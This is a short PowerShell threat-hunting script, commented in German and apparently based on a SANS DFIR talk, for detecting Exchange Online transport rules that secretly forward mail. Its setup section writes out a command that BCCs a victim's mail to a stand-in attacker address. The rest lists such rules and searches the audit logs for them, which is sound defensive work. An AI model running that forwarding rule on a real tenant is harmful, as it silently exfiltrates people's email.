#SCRIPTNAME: Hunt Mailforwarding in EX Online

#Target: setzen von mbx forward erkennen 
#Cloud Service: Exchange Online
#Risiko: unbemerktes forwarden von mails auf Transport rule Ebene(benötigt admin rechte)
#Quelle: SANS DFIR SUMMIT 2022

#CONFIG: Forward einrichten mit Transport rule
New-TransportRule -Name 'MaliciousForwardMail' -Priority '0' -Enabled $true -SentTo 'Victim@threathunting.onmicrosoft.com' -BlindCopyTo 'attacker@threatactor.com'

#REPORT: Alle Forwarding Rules ausgeben
Get-TransportRule | where-object{($Null -ne $_.BlindCopyTo)}

#DETECT: Admin Audit Logs
Search-AdminAuditLog -Cmdlets New-TransportRule,Set-TransportRule -parameter BlindCopyTo |Export-Csv C:\temp\AALog-Transport.csv

#DETECT: Unified audit Logs
$logs = Search-UnifiedAuditLog -Operations New-TransportRule, Set-TransportRule -StartDate 2022-01-01 -EndDate 2022-06-30
ForEach ($record in $logs){
$AuditData = $record.AuditData | ConvertFrom-Json
if ( $AuditData.Parameters | Where-Object Name -eq 'BlindCopyTo' )
{$record}}

#WE>>MER